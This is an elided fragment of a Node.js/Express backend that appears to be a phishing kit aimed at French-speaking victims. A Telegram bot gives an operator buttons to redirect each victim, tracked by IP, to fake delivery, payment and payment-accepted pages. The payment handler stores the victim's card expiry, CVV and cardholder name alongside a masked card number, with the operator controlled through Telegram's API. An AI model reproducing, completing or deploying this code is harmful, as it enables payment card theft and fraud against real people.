...
async function sendTelegramNotif(data){
  ...
  const keyboard = {
    inline_keyboard:[
      ...
      [{text:'📦 Livraison', callback_data:'redirect|'+data.ip+'|/order.html'}],
      [{text:'💳 Paiement', callback_data:'redirect|'+data.ip+'|/payment.html'}],
      [{text:'✅ Valider paiement', callback_data:'redirect|'+data.ip+'|/payment_accepted.html'}]
    ]
  };
...
app.post('/api/payment',(req,res)=>{
  ...
  sessions[ip].data.card = { panMasked:'**** **** **** '+(cardNumber?cardNumber.slice(-4):'0000'), expiry, cvv, nomTitulaire };
  ...
  if(cb){
    ...
    if(action==='redirect' && sessions[ip]){
      ...
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({callback_query_id:cb.id,text:'Redirection envoyée.'})
      });
    }
  }
  res.sendStatus(200);
